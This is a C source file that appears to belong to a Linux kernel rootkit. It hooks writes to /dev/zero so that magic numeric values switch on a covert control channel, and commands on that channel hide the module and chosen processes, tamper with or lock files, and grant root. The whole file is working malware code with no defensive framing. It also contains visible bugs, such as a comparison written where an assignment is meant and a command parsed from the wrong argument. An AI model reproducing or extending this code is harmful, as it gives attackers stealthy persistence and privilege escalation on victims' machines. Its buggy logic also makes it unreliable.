#include "utils.h"
#include "file.h"
#include "rk_vars.h"
#include "process.h"



static ssize_t (*orig_write_zero)(struct file *file, const char __user *buf, size_t count, loff_t *ppos);

int control_zero = 0;
int hidden = 0;
int hide_m = 0;

static ssize_t rk_write_zero(struct file *file, const char __user *buf, size_t count, loff_t *ppos)
{
    const char *zero = file->f_path.dentry->d_name.name;
	int ret = 0;
	long write_zero=0, zero_write=0, cmd=0;


    if(strcmp (zero, "zero") == 0)
    {
		char **a;
		int argc;
		long pid;
		char *name = kzalloc( (count+1)*sizeof(char), GFP_KERNEL);
		if (name == NULL)
        	return orig_write_zero(file, buf, count, ppos);

		if (strncpy_from_user(name, buf, count) > 0) {
			a = argv_split(GFP_KERNEL, name, &argc);

			if(argc > 1) {
				if(!kstrtol(a[0], 10, &write_zero));  // to avoid warnings
				if(!kstrtol(a[1], 10, &zero_write));
				if(!kstrtol(a[1], 10, &cmd));


				if (write_zero == WRITE_ZERO && ZERO_WRITE == zero_write) {
					if (control_zero) {
						control_zero = 0;
					} else {
						control_zero = 1;
					}
					//printk(KERN_DEBUG "CONTROL : %d HETE bytes\n", control_zero);
					goto out;
				}
				//printk(KERN_DEBUG "CONTROL : %d HETE bytes\n", control_zero);
				//printk(KERN_DEBUG "HIDE PROC : %d HETE bytes\n", write_zero);

				if(control_zero && write_zero == WRITE_ZERO)
				{
					switch (cmd) {
						case 0: 
							#ifndef CONFIG_AUTO_HIDE
							if(hide_m == 0) {
								rk_hide();
								hide_m == 1;
							}
							#endif
							break;
						case 1:
							flip_hidden_flag();
							if(argc > 2) {
								if(!kstrtol(a[2], 10, &pid));
								#ifdef CONFIG_HIDE_PROCESS
									hide_proc(pid);
								#endif
							}
							break;
						case 2:
							#ifdef CONFIG_FILE_TAMPERING
								file_tampering();
							#endif
							break;
						case 3:
							#ifdef CONFIG_FILE_TAMPERING
								file_no_open_no_write_no_delete();
							#endif
							break;
						case 4:
							
							#ifdef CONFIG_GIVE_ROOT
								get_root();
							#endif
						default:
							goto origin;
					}
					goto out;
				}

			}

		origin:
			//argv_free(a);
			ret = orig_write_zero(file, buf, count, ppos);
		}
		out:
			argv_free(a);
			kfree(name);
			return 2023;
    }
	else 
	{
		return orig_write_zero(file, buf, count, ppos);
	}
}

